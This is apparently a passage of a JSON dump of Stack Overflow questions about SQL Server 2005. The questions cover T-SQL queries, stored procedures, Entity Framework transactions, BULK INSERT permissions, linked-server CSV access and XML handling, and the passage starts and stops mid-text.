(YEAR(A.actTargetDate) &gt; 1900)\n                AND (\n\n                      A.actState = 4\n                    )\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END \n        AS actTgtCompleteDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END AS actTgtODueDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN NULL --'overdue'\n           WHEN YEAR(A.actTargetDate) &gt; 1900\n                AND (\n                     A.actState = 3\n                     OR A.actState = 4\n                    ) THEN NULL --'complete'\n           WHEN YEAR(A.actTargetDate) &lt;= 1900\n           THEN NULL\n           ELSE CONVERT(VARCHAR(9), A.actTargetDate, 6)\n        END AS RATgtDate\n        ,dbo.FULLNAME(A.actNomineeId) AS ActNominee         \n        ,dbo.FULLNAME(A.actOwnerId) AS ActOwner         \n        ,A.actCompletionAmount AS CompletionAmount          \n        ,isnull((CASE A.actOwningTableNum\n        WHEN 2 THEN dbo.RiskControlPrefixId(A.actOwningId)+ '/' + dbo.ActionPrefixId(A.actId)+ ':' + Cast(actCommentary as Varchar(MAX))\n        WHEN 3 THEN dbo.ActionPrefixId(A.actId) + ':' + Cast(actCommentary as Varchar(MAX)) END),'') AS ActionDetail\n            ,actOwningTableNum AS AType\n        ,dbo.[ActionStatusStr](A.actState)  \n    FROM Actions A\n        INNER JOIN @RiskData RD ON RD.rskId = A.actOwningId\n        INNER JOIN @TopRisk TR ON TR.rskId = A.actOwningId\n    WHERE    A.actOwningTableNum = 3\n        AND (A.actState &lt; 4) AND (A.actstate != 3)\n\n    UNION\n\n    -- Risk Control  Actions for all the risk controls in @RiskCtrl table\n    SELECT   RC.rcnRiskId AS ActionRiskId\n        ,RC.rcnId AS ControlID\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (\n                    -- A.actState &gt; 2                        AND \n                        A.actState &lt;= 4\n                    )\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END \n        AS actTgtCompleteDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN CONVERT (VARCHAR(9), A.actTargetDate, 6)\n           ELSE NULL\n        END AS actTgtCompleteDate\n        ,CASE WHEN (YEAR(A.actTargetDate) &gt; 1900)\n                AND (A.actState &lt; 3)\n                AND (A.actTargetDate &lt;= @ThisDate)\n           THEN NULL --'overdue'\n           WHEN YEAR(A.actTargetDate) &gt; 1900\n                AND (\n                     A.actState = 3\n                     OR A.actState = 4\n                    ) THEN NULL --'compete'\n           WHEN YEAR(A.actTargetDate) &lt;= 1900\n           THEN NULL\n           ELSE CONVERT (VARCHAR(9), A.actTargetDate, 6)\n        END AS RATgtDate\n        ,dbo.FULLNAME(actNomineeId) AS ActNominee\n        ,dbo.FULLNAME(actOwnerId) AS ActOwner           \n        ,A.actCompletionAmount AS CompletionAmount\n        ,CASE A.actOwningTableNum\n        WHEN 2 THEN dbo.RiskControlPrefixId(A.actOwningId) + '/' + dbo.ActionPrefixId(A.actId) + ':' + Cast(actCommentary as Varchar(MAX))\n                       WHEN 3 THEN dbo.ActionPrefixId(A.actId) + ':' + Cast(actCommentary as Varchar(MAX)) END AS ActionDetail\n        -- A.actDescription END AS ActionDetail             ,actOwningTableNum AS AType\n        ,dbo.[ActionStatusStr](A.actState)\n    FROM     Actions A\n        RIGHT OUTER JOIN RiskControls RC\n        ON       A.actOwningId = RC.rcnId\n        INNER JOIN @RiskCtrl TRC\n        ON       TRC.rcnRiskId = RC.rcnRiskId\n    WHERE    (A.actOwningTableNum = 2)\n        AND (A.actState &lt; 4) AND (A.actstate != 3)\n\n\n\n    IF (@RsdlInh = '1') \n</code></pre>\n\n<p>BEGIN   </p>\n\n<p>SELECT   RD.* \n                ,NULL AS rcnId\n                ,NULL AS ControlInfo\n                ,NULL AS Performance\n                ,NULL AS Design\n                ,NULL AS ControlOwner\n                ,NULL AS ControlNominee\n                ,NULL AS ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n            INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n            LEFT OUTER JOIN @ACTIONS A\n            ON       (\n                      RD.rskid = A.ActionRiskId\n                      AND A.AType = 3\n                     )\n                UNION\n        SELECT   RD.*\n                ,RC.rcnId\n                ,RC.ControlInfo\n                ,RC.Performance\n                ,RC.Design\n                ,RC.ControlOwner\n                ,RC.ControlNominee\n                ,RC.ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n        INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n        INNER JOIN @RiskCtrl RC ON RD.rskId = RC.rcnRiskId\n        LEFT OUTER JOIN @ACTIONS A\n        ON       (\n                  A.AType = 2\n                  AND RC.rcnId = A.ControlID\n                 )<br>\n                    ORDER BY RD.RsdAnnualExp DESC \nEND</p>\n\n<p>IF (@RsdlInh = '2') \nBEGIN   </p>\n\n<p>SELECT   RD.* \n                ,NULL AS rcnId\n                ,NULL AS ControlInfo\n                ,NULL AS Performance\n                ,NULL AS Design\n                ,NULL AS ControlOwner\n                ,NULL AS ControlNominee\n                ,NULL AS ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n            INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n            LEFT OUTER JOIN @ACTIONS A\n            ON       (\n                      RD.rskid = A.ActionRiskId\n                      AND A.AType = 3\n                     )\n                UNION\n        SELECT   RD.*\n                ,RC.rcnId\n                ,RC.ControlInfo\n                ,RC.Performance\n                ,RC.Design\n                ,RC.ControlOwner\n                ,RC.ControlNominee\n                ,RC.ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n        INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n        INNER JOIN @RiskCtrl RC ON RD.rskId = RC.rcnRiskId\n        LEFT OUTER JOIN @ACTIONS A\n        ON       (\n                  A.AType = 2\n                  AND RC.rcnId = A.ControlID\n                 )<br>\n                    ORDER BY RD.InhAnnualExp DESC \nEND</p>\n\n<p>IF (@RsdlInh = '3') \nBEGIN   </p>\n\n<p>SELECT   RD.* \n                ,NULL AS rcnId\n                ,NULL AS ControlInfo\n                ,NULL AS Performance\n                ,NULL AS Design\n                ,NULL AS ControlOwner\n                ,NULL AS ControlNominee\n                ,NULL AS ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n            INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n            LEFT OUTER JOIN @ACTIONS A\n            ON       (\n                      RD.rskid = A.ActionRiskId\n                      AND A.AType = 3\n                     )\n                UNION\n        SELECT   RD.*\n                ,RC.rcnId\n                ,RC.ControlInfo\n                ,RC.Performance\n                ,RC.Design\n                ,RC.ControlOwner\n                ,RC.ControlNominee\n                ,RC.ControlReviewer\n                ,A.*<br>\n        FROM     @RiskData RD\n        INNER JOIN @TopRisk TR ON TR.rskId=RD.rskId\n        INNER JOIN @RiskCtrl RC ON RD.rskId = RC.rcnRiskId\n        LEFT OUTER JOIN @ACTIONS A\n        ON       (\n                  A.AType = 2\n                  AND RC.rcnId = A.ControlID\n                 )<br>\n                    ORDER BY RD.RsdAnnualExp DESC </p>\n\n<p>END</p>\n\n<p>Please help!!</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":421,"score":1,"question_id":5378357,"title":"Error: There are uncommitted transactions","body":"<p>I open a new window in SSMS and run this:</p>\n\n<pre><code>SET ANSI_DEFAULTS ON \nGO\n\nCREATE PROCEDURE [dbo].[zzz_test2]\n(\n    @a    int\n)\nAS\n    SET NOCOUNT ON\n    SET @a=1\n    RETURN 0\nGO\n</code></pre>\n\n<p>and then close the window, which results in this warning:</p>\n\n<p><code>There are uncommitted transactions. Do you wish to commit these before closing the window?</code></p>\n\n<p>what is going on??</p>\n\n<p>when I open a new SSMS window and run this:</p>\n\n<pre><code>SET ANSI_NULLS  ON  \nGO    \n\nCREATE PROCEDURE [dbo].[zzz_test2]\n(\n    @a    int\n)\nAS\n    SET NOCOUNT ON\n    SET @a=1\n    RETURN 0\nGO\n</code></pre>\n\n<p>and close the window, I get no warning.</p>\n"},{"tags":["winforms","sql-server-2005","bulkinsert"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12730206,"title":"SQL server BULK INSERT fails, with access denied error","body":"<p>I am trying to do a <code>BULK INSERT</code> from a CSV file into SQL Server 2005 through a Windows application. Now the application uses SQL Server authentication.</p>\n\n<p>When the user tries to upload a file from file server, it's giving the following exception</p>\n\n<blockquote>\n  <p><em>Cannot bulk load because the file \"\\shared\\data.csv \" could not be opened. Operating system error code 5(Access is denied.)</em></p>\n</blockquote>\n\n<p><a href=\"http://stackoverflow.com/questions/852117/bulk-insert-error-with-unc-path-and-windows-authentication/855896#855896%20http://thesqldude.com/2011/12/30/how-to-sql-server-bulk-insert-with-constrained-delegation-access-is-denied/\">Found this query raised earlier</a> and <a href=\"http://thesqldude.com/2011/12/30/how-to-sql-server-bulk-insert-with-constrained-delegation-access-is-denied/\" rel=\"nofollow\">this</a> post, but both of them talks about the case were Windows authentication is used (which is not the case here). DBA here strictly does not allow permission for SQL service account for the shared folder citing security violations</p>\n\n<p>Appreciate any help or guidance</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":12726098,"title":"increase counter while using exec","body":"<p>I want to use a counter in a way like the below one:</p>\n\n<pre><code>exec\n('begin insert into ' + @temp07 + ' (FileID,FileName)\nSelect aof_id,aof_fileName from PaFi07(' + @partId + ');\n\nsp_executesql @sqlCounter, N'@intCount int output, @intConst int,  @intCount = @intCount output,  @intConst = @intConst \nend')\n</code></pre>\n\n<p>so how can i let the counter work?</p>\n\n<p>any suggestion that the counter work inside this EXEC command\nTHANX</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12726090,"title":"Cant use LIKE but need to find related records in SQL Server","body":"<p>I've got a table used for issue tracking (kind of like stackoverflow :) to log PC related issues) and for simplicity I'll narrow it down to a few fields, something like the following:</p>\n\n<pre><code>Site               Category          Issue\nMI Office          Software          My MS word does not run macros.\nCL Office          Hardware          PC memory needs to be upgraded\nMX Office          Printer           Printer is out of memory.\nMI Office          Software          Office product prompts for allowing macro to run\n</code></pre>\n\n<p>I want to find related issues when I am looking at for instance one issue.  I can't really use the <code>LIKE</code> operator as for instance if I do:</p>\n\n<p><code>SELECT...FROM...WHERE Issue LIKE '%My MS word does not run macros.%'</code></p>\n\n<p>Would only return the first record.  Do I have to figure out how to pull key words like \"Macros\" ?  How would I find related records so that my query for instance could return records 1 and 4.  Or return 2 and 3 together?</p>\n"},{"tags":["sql-server-2008","entity-framework","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12720738,"title":"Stored procedure execution in Entity Framework in SQL Server 2005","body":"<p>I am using MVC3 and Entity Framework for calling a stored procedure in SQL Server 2008. The procedure has no parameters and in the profiler I get the proc execution as</p>\n\n<pre><code>exec sp_executesql N'sp_GetDashSessionboardRoomTimeSlot', N'@p0 nvarchar(4000)', @p0=NULL\n</code></pre>\n\n<p>This is how I call in the c# code.</p>\n\n<pre><code>SqlParameter sa = null;\nvar query = from dashboardData in TBSCIDBContext.Database.SqlQuery&lt;SessionDashboardData&gt;(\"sp_GetDashSessionboardRoomTimeSlot\", sa)\n            select dashboardData;\n</code></pre>\n\n<p>This works fine. But I have changed my database to SQL Server 2005 and I need to use it </p>\n\n<p>So when I call the same procedure using the same C# code the profiler returns the same exec statement but the sql gives error </p>\n\n<blockquote>\n  <p>Incorrect syntax near 'sp_GetDashSessionboardRoomTimeSlot'</p>\n</blockquote>\n\n<p>pls help me in how to fix this problem as I need to use this stored procedure and in SQL Server 2005</p>\n"},{"tags":["xml","sql-server-2008","tsql","sql-server-2005","validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12724440,"title":"SQL Server :  validate XML","body":"<p>I'm using SQL Server 2005 and 2008 and am trying to import a variety different XML files into my db, and occasionally the XML is not valid. Each XML file will differ from the last.</p>\n\n<p>Is there any way to create a function which will return 0 or 1 depending on whether the XML is valid?</p>\n\n<p>Thanks</p>\n\n<p>C</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12723098,"title":"Synchronise tables in sql","body":"<p>I got 7 tables in sql server 2005 having relation with each other based on primary key and foreign keys. I need to make a new table which will contain columns of all the 7 tables together. I need this new table to be synchronised every time with the main 7 tables. What is the best way to do this in Sql server 2005 or 2008..</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12722728,"title":"Query to find the first date after a specific grouped sum value","body":"<p>I have an article table that holds the current stock for each article. I need to know the last date when new stock has arrived, after running out of stock for that specific article.</p>\n\n<p>The table looks like this.</p>\n\n<pre><code>+-----------+-----------------+-------+\n| ArticleID |    StockDate    | Stock |\n+-----------+-----------------+-------+\n|         1 | 1/1/2012 10:15  |   100 |\n|         1 | 2/1/2012 13:39  |   -50 |\n|         1 | 2/1/2012 15:17  |   -50 |\n|         1 | 4/1/2012 08:05  |   100 |\n|         2 | 5/1/2012 09:48  |    50 |\n|         1 | 6/1/2012 14:21  |   -25 |\n|         1 | 7/1/2012 16:01  |    10 |\n|         2 | 8/1/2012 13:42  |   -10 |\n|         1 | 9/1/2012 09:56  |   -85 |\n|         1 | 13/1/2012 08:12 |   100 |\n|         1 | 13/1/2012 10:50 |   -15 |\n+-----------+-----------------+-------+\n</code></pre>\n\n<p>The output should look like this.</p>\n\n<pre><code>+-----------+-----------------+\n| ArticleID |    StockDate    |\n+-----------+-----------------+\n|         2 | 5/1/2012 09:48  |\n|         1 | 13/1/2012 08:12 |\n+-----------+-----------------+\n</code></pre>\n\n<p>How did i get this output? ArticleID 1 had a 100 in stock but reached 0 for the first time on 2/1/2012 15:17. Then new stock arrived and it hit 0 again at 9/1/2012 09:56. So the result should shows the first date after the last empty stock grouped by ArticleID. ArticleID 2 didn't had a 0 point, so the first stock date is shown.</p>\n\n<p>I need a result set that can be joined with other queries. So a Stored Procedure does not work for me.</p>\n"},{"tags":[".net","sql-server-2005","entity-framework"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1700,"score":4,"question_id":3266295,"title":".Net Entity Framework and Transactions","body":"<p>Being new to the EF, I'm really rather stuck on how to proceed with this set of issues. On the project I am currently working on, the entire site is heavily integrated with the EF model. At first, the access to the EF context was being controlled using an IOC bootstrapper. For operational reasons we were not able to use IOC. I removed this and used a model of individual instances of the context object where required. I started getting the following exception:</p>\n\n<p><code>The type 'XXX' has been mapped more than once.</code></p>\n\n<p>We came to the conclusion that the different instances of the context were causing this issue. I then abstracted the context object into a single static instance which was being accessed by each thread/page. I'm now getting one of several exceptions about transactions:</p>\n\n<p><code>New transaction is not allowed because there are other threads running in the session.</code></p>\n\n<p><code>The transaction operation cannot be performed because there are pending requests working on this transaction.</code></p>\n\n<p><code>ExecuteReader requires the command to have a transaction when the connection assigned to the command is in a pending local transaction. The Transaction property of the command has not been initialized.</code></p>\n\n<p>The last of these exceptions occurred on a load operation. I wasn't trying to save the context state back to the Db on the thread that failed. There was another thread performing such an operation however.</p>\n\n<p>These exceptions are intermittent at best, but I have managed to get the site to go into a state where new connections were refused due to a transaction lock. Unfortunately I cannot find the exception details.</p>\n\n<p>I guess my first question is, should the EF model be used from a static single instance? Also, is it possible to remove the need for transactions in EF? I've tried using a <code>TransactionScope</code> object without success...</p>\n\n<p>To be honest I'm a lot stuck here, and cannot understand why (what should be) fairly simple operations are causing such an issue...</p>\n\n<p>Cheers,\nsicknote</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12721869,"title":"Alter a SQL server function to accept new optional parameter","body":"<p>I already have a function in SQL Server 2005 as:</p>\n\n<pre><code>ALTER function [dbo].[fCalculateEstimateDate] (@vWorkOrderID numeric)\nReturns varchar(100)  AS\nBegin\n  &lt;Function Body&gt;\nEnd\n</code></pre>\n\n<p>I want to modify this function to accept addition optional parameter @ToDate. I am going to add logic in function if @Todate Provided then do something else continue with existing code.</p>\n\n<p>I modified the function as:</p>\n\n<pre><code>ALTER function [dbo].[fCalculateEstimateDate] (@vWorkOrderID numeric,@ToDate DateTime=null)\nReturns varchar(100)  AS\nBegin\n  &lt;Function Body&gt;\nEnd\n</code></pre>\n\n<p>Now I can call function as:</p>\n\n<pre><code>SELECT dbo.fCalculateEstimateDate(647,GETDATE())\n</code></pre>\n\n<p>But it gives error on following call:</p>\n\n<pre><code>SELECT dbo.fCalculateEstimateDate(647)\n</code></pre>\n\n<p>as</p>\n\n<blockquote>\n  <p>An insufficient number of arguments were supplied for the procedure or\n  function dbo.fCalculateEstimateDate.</p>\n</blockquote>\n\n<p>which as per my understanding should not happen.</p>\n\n<p>Am I missing anything?\nThanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2144,"score":1,"question_id":2197727,"title":"connect sql server 2005/2008 over internet","body":"<p>How do I connect to SQL Server 2005/2008 using Management Studio or other desktop application over the internet?</p>\n"},{"tags":["sql-server-2005","logging","vb.net-2010","audit-trail"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12720444,"title":"The best solution for creating logging system","body":"<p>can someone tell me what the best solution is for creating logging system (Audit trail) !? \nI'm using vb.net with MSSQL 2005</p>\n"},{"tags":["c#","asp.net","sql-server-2005","activity"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":201,"score":6,"question_id":9063836,"title":"Last Activity Date - Better Ideas for implementation","body":"<p>For a typical user registration and membership system i follow in ASP.NET website i would like to update the last activity date and time. Which of the below methods would be ideal to follow.</p>\n\n<h3>1</h3>\n\n<p>Whenever a request is made to a method that access the data from the user account table, automagically(O_o)  update the <code>last_account_activity</code> date using <code>GETDATE()</code></p>\n\n<h3>2</h3>\n\n<p>Call <code>UpdateLastActivity()</code> as a method external after a method is called from the membership system.</p>\n\n<p>info:</p>\n\n<p>In terms of reliability the #2 is ideal because i can't rely in #1 when user actively using data from other tables rather than user account table.</p>\n\n<p>What do you think? U got another way for me to do it? </p>\n\n<h3>Specs</h3>\n\n<p>.NET Framework 2.0</p>\n\n<p>Asp.net 2.0</p>\n\n<p>Custom Membership Provider Implementation</p>\n\n<p>Sql Server 2005 Database</p>\n"},{"tags":["sql","sql-server-2005","foreign-key-relationship"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2194,"score":2,"question_id":3178709,"title":"Foreign key referencing a 2 columns primary key in SQL Server","body":"<p>This question is pretty much similar to <a href=\"http://stackoverflow.com/questions/953035/multiple-column-foreign-key-in-mysql\">this one</a>, but for SQL Server 2005 :</p>\n\n<p>I have 2 tables in my database:</p>\n\n<pre><code>--'#' denotes the primary key\n[Libraries]\n#ID   #Application  Name\n 1     MyApp        Title 1\n 2     MyApp        Title 2\n\n\n[Content]\n#ID   Application  LibraryID  Content\n 10    MyApp       1          xxx\n 11    MyApp       1          yyy\n</code></pre>\n\n<p>(the database is obviously much more complex and having this double key makes sense)</p>\n\n<p>Each library is identified by its unique ID and Application name. I'm trying to ensure that each content is properly referencing an existing library.</p>\n\n<p>When creating the constraint (using the Wizard) as</p>\n\n<pre><code>Primary key table            Foreign key table\n[Libraries]                  [Content]\nID                  ---&gt;     LibraryID\nApplication         ---&gt;     Application\n</code></pre>\n\n<p>I have the following error: </p>\n\n<blockquote>\n  <p>The columns in table 'Libraries' do\n  not match an existing primary key or\n  UNIQUE constraint</p>\n</blockquote>\n\n<p>Do you have any idea of what is going on? and if it's possible at all using SQL Server? (I can't modify the [Library] table at all)</p>\n\n<p>Thanks a lot for your help!</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":4978,"score":7,"question_id":4024072,"title":"How to remove accents and all chars <> a..z in sql-server?","body":"<p>I need to do the following modifications to a varchar(20) field:</p>\n\n<ol>\n<li>substitute accents with normal letters (like è to e)</li>\n<li>after (1) remove all the chars not in a..z</li>\n</ol>\n\n<p>for example</p>\n\n<pre><code>'aèàç=.32s df' \n</code></pre>\n\n<p>must become </p>\n\n<pre><code>'aeacsdf'\n</code></pre>\n\n<p>are there special stored functions to achieve this easily?</p>\n\n<p><strong>UPDATE</strong>: please provide a T-SQL not CLR solution. This is the workaround I temporarly did because it temporarly suits my needs, anyway using a more elegant approach would be better.</p>\n\n<pre><code>CREATE FUNCTION sf_RemoveExtraChars (@NAME nvarchar(50))\nRETURNS nvarchar(50)\nAS\nBEGIN\n  declare @TempString nvarchar(100)\n  set @TempString = @NAME \n  set @TempString = LOWER(@TempString)\n  set @TempString =  replace(@TempString,' ', '')\n  set @TempString =  replace(@TempString,'à', 'a')\n  set @TempString =  replace(@TempString,'è', 'e')\n  set @TempString =  replace(@TempString,'é', 'e')\n  set @TempString =  replace(@TempString,'ì', 'i')\n  set @TempString =  replace(@TempString,'ò', 'o')\n  set @TempString =  replace(@TempString,'ù', 'u')\n  set @TempString =  replace(@TempString,'ç', 'c')\n  set @TempString =  replace(@TempString,'''', '')\n  set @TempString =  replace(@TempString,'`', '')\n  set @TempString =  replace(@TempString,'-', '')\n  return @TempString\nEND\nGO\n</code></pre>\n"},{"tags":["sql","xml","query","sql-server-2005","xml-parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":12713871,"title":"How to read a xml in SQL Server 2005?","body":"<p>I have this query</p>\n\n<pre><code>WITH XMLNAMESPACES (DEFAULT 'http://www.w3.org/2005/Atom') \nselect \ncast(idsku as int) idsku,\ncast(entregado as int) entregado from #final1 final FOR XML AUTO, ROOT ('clientesxml'), ELEMENTS \n</code></pre>\n\n<p>this return  </p>\n\n<pre><code>&lt;clientesxml xmlns=\"http://www.w3.org/2005/Atom\"&gt;\n  &lt;final&gt;\n    &lt;idsku&gt;191&lt;/idsku&gt;\n    &lt;entregado&gt;159&lt;/entregado&gt;\n  &lt;/final&gt;\n&lt;/clientesxml&gt;\n</code></pre>\n\n<p>My question how do I create a stored procedure which reads the XML returned and converts it into a <code>#tempTable</code> ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":7,"favorite_count":3,"up_vote_count":11,"down_vote_count":0,"view_count":15156,"score":11,"question_id":1488355,"title":"IF EXISTS, THEN SELECT ELSE INSERT AND THEN SELECT","body":"<p>How do you say the following in Microsoft SQL Server 2005:</p>\n\n<pre><code>IF EXISTS (SELECT * FROM Table WHERE FieldValue='') THEN\n   SELECT TableID FROM Table WHERE FieldValue=''\nELSE\n   INSERT INTO TABLE(FieldValue) VALUES('')\n   SELECT TableID FROM Table WHERE TableID=SCOPE_IDENTITY()\nEND IF\n</code></pre>\n\n<p>What I'm trying to do is to see if there is a blank fieldvalue already, and if there is then return that TableID, else insert a blank fieldvalue and return the corresponding primary key.</p>\n"},{"tags":["sql-server-2005"],"answer_count":5,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":11120,"score":13,"question_id":1899846,"title":"How to delete all rows from all tables in a SQL Server database?","body":"<p>How to delete all rows from all tables in a SQL Server database?</p>\n"},{"tags":["sql-server","sql-server-2005","csv","linked-server"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1566,"score":0,"question_id":5541667,"title":"Unable to access CSV file using linked server using any login other than 'sa'","body":"<p>I've set up a linked server to read a set of CSV files located locally on the SQL Server machine, as follows:</p>\n\n<pre><code>USE master\ngo\n\nIF EXISTS (SELECT * FROM sys.servers WHERE name = 'MyLink') \n    EXEC sp_dropserver 'MyLink', 'droplogins'; \n\nEXEC sp_AddLinkedServer @server     = 'MyLink', \n                        @srvproduct = '',\n                        @provider   = 'Microsoft.ACE.OLEDB.12.0', \n                        @datasrc    = 'C:\\Data\\Feeds', \n                        @provstr    = 'Text'\n\nEXEC sp_AddLinkedSrvLogin MyLink, FALSE\ngo\n</code></pre>\n\n<p>The following code then works perfectly, provided I'm logged in as 'sa' (either syntax works):</p>\n\n<pre><code>SELECT * FROM MyLink...myFile#csv\nSELECT * FROM OPENQUERY(MyLink,'select * from myFile.csv')\n</code></pre>\n\n<p>If I log in as any other user, however, I get the following error:</p>\n\n<pre><code>Msg 7416, Level 16, State 2, Line 1\nAccess to the remote server is denied because no login-mapping exists.\n</code></pre>\n\n<p>Trying to change the remote login, either via script, or by modifying the linked server properties in SSMS to add a mapping, not only doesn't work but also breaks the ability of 'sa' to run the select statements.</p>\n\n<p>BTW, I'm trying to work around a <a href=\"http://connect.microsoft.com/SQLServer/feedback/details/127114/flat-file-source-incorrectly-parsing-data-when-using-comma-as-the-column-delimiter\" rel=\"nofollow\">known bug</a> in SSIS where it cannot handle CSV with commas inside double-quote-delimited fields.  I stumbled across <a href=\"http://www.sqlservercentral.com/Forums/Topic559811-149-1.aspx#bm559856\" rel=\"nofollow\">this post</a> which describes using a linked server to get around the problem without having to code a custom parsing routine.  Works great, except for the whole security thing; I don't want my application connecting as 'sa'.  I'm using SQL 2005 SP3.</p>\n\n<p>Any ideas on getting this to work with a run-of-the-mill login?</p>\n\n<p>TIA,\nJim</p>\n\n<p>@JustinStolle When I set it up as you describe, I get a different error for the non-sa user (sa still seems to work):</p>\n\n<p>OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"MyLink\" returned message \"Cannot start your application. The workgroup information file is missing or opened exclusively by another user.\".\nMsg 7399, Level 16, State 1, Line 1\nThe OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"MyLink\" reported an error. Authentication failed.\nMsg 7303, Level 16, State 1, Line 1\nCannot initialize the data source object of OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"MyLink\".</p>\n\n<p>I can't import the file; SSIS can't handle it.</p>\n"},{"tags":["c#",".net","sql-server-2005","linq-to-sql","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12607393,"title":"How to send string-named arguments to a stored procedure?","body":"<p>I have a stored procedure with a large number of parameters (>50), the vast majority of which are optional. I would like to be able to call it like this:</p>\n\n<pre><code>var result = context.MySproc(\n               new Dictionary&lt;string, string&gt;()\n               {\n                   {\"foo\",\"bar\"},\n                   {\"baz\",\"xyzzy\"}\n               });\n</code></pre>\n\n<p>The parameters needed will vary dynamically.</p>\n\n<p>The DB call must be a stored procedure (not up to me), and it must use the existing <code>DataContext</code> rather than setting up a new connection.</p>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005","asp.net-4.0","asp.net-3.5"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":136,"score":1,"question_id":12660926,"title":"Add Column in Grid view according to SQL query","body":"<p>I am using this query:</p>\n\n<pre><code>select EmployeeId, receptionist_name, date_of_sale,\n  count(date_of_sale) \nfrom FrontOffice \ngroup By EmployeeId, receptionist_name, date_of_sale \norder by date_of_sale\n</code></pre>\n\n<p>for filling the grid view. But I can bound the <code>EmployeeId</code>, <code>receptionist_name</code>, <code>date_of_sale</code>, so can you tell me how can I bound the 4th column in grid view and how to fill the grid view.</p>\n\n<p><strong>UPDATE:</strong> Here is the code I am using:</p>\n\n<pre><code>&lt;Columns&gt; \n    &lt;asp:BoundField HeaderText=\"Date\" DataField=\"date_of_sale\" /&gt; \n    &lt;asp:BoundField HeaderText=\"Employe Id\" DataField=\"EmployeeId\" /&gt; \n    &lt;asp:BoundField HeaderText=\"Receiptist Name\" DataField=\"receptionist_name\" /&gt; \n    &lt;asp:TemplateField HeaderText=\"No. of Prospectus Sale\"&gt; \n    &lt;ItemTemplate&gt; \n        &lt;asp:Label ID=\"salecount\" runat=\"server\" \n          Text='&lt;%# Eval(\"SaleCount\") %&gt;'&gt;&lt;/asp:Label&gt; \n    &lt;/ItemTemplate&gt; \n    &lt;/asp:TemplateField&gt; \n&lt;/Columns&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005","alert","jobs"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12703715,"title":"SQL Server 2005 Job - Trigger Alert","body":"<p>How to Schedule jobs on the database that checks for an alert condition (must be configurable/dynamic).</p>\n\n<p>If there is change in the database data or if the values in a column fall in a range of values that are provided as input, I want the alert to be scheduled that will sent alert as email</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12706287,"title":"SQL Server varchar equality test gives syntax 